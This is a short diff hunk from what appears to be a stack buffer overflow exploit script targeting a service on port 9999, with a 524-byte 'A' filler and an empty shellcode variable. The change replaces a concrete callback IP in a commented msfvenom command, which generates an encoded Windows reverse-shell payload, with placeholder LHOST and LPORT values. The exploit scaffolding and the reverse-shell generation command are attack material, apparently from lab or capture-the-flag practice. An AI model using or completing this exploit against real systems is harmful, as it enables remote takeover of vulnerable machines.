@@ -8,7 +8,7 @@ port = 9999
 timeout = 5
 
 # Generate Shell Code
-# msfvenom -p windows/shell_reverse_tcp LHOST=10.6.18.148 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
+# msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
 shell_code = ("")
 
 filler = "A" * 524
